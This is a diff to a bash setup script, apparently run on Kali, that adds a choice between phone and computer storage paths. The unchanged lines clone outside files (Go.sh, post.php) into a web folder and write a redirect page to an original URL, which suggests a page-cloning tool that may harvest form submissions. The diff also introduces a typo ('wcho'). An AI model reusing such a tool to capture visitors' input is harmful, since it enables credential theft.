@@ -1,3 +1,12 @@
+wcho "Choose your device: "
+echo "1. Phone"
+echo "2. Computer"
+read -r device
+if [ $device == "1" ]; then
+loc="/sdcard"
+else
+loc="/mnt/d"
+fi
 echo
 echo
 echo "Website Name: "
@@ -8,24 +17,24 @@ else
 echo "Fine! web folder existed in kali's files.."
 fi
 echo
-if [ ! -e "/mnt/d/web" ]; then
-cd /mnt/d/ && mkdir web
+if [ ! -e "$loc/web" ]; then
+cd $loc/ && mkdir web
 else
 echo "Fine! web folder existed in D drive"
 fi
-if [ -e "/mnt/d/web/$website" ]; then 
+if [ -e "$loc/web/$website" ]; then 
 echo "Fine! $website folder existed"
 else
-cd /mnt/d/web && mkdir "$website"
+cd $loc/web && mkdir "$website"
 fi
 echo "      Put your index.html inside web/$website folder" 
 echo " Press Y if already inserted else press N"
 read -p $"  Yes / No:  " option
 if [[ $option == "Y" || $option == "y" ]]; then
-cd /mnt/d/web/$website
+cd $loc/web/$website
 git clone https://github.com/NganDii/webmakerfiles
 cd webmakerfiles
-cp Go.sh post.php /mnt/d/web/$website
+cp Go.sh post.php $loc/web/$website
 cd ..
 rm -rf webmakerfiles
 cat <<EOF>run.sh
@@ -40,9 +49,9 @@ cat <<EOF>location.php
 header ('Location: $ori');
 ?>
 EOF
-cd /mnt/d/web/
+cd $loc/web/
 rm -rf ~/web/$website
-cp -r /mnt/d/web/$website ~/web
+cp -r $loc/web/$website ~/web
 cd ~
 else
 echo "Add files in /web/$website and come back again"
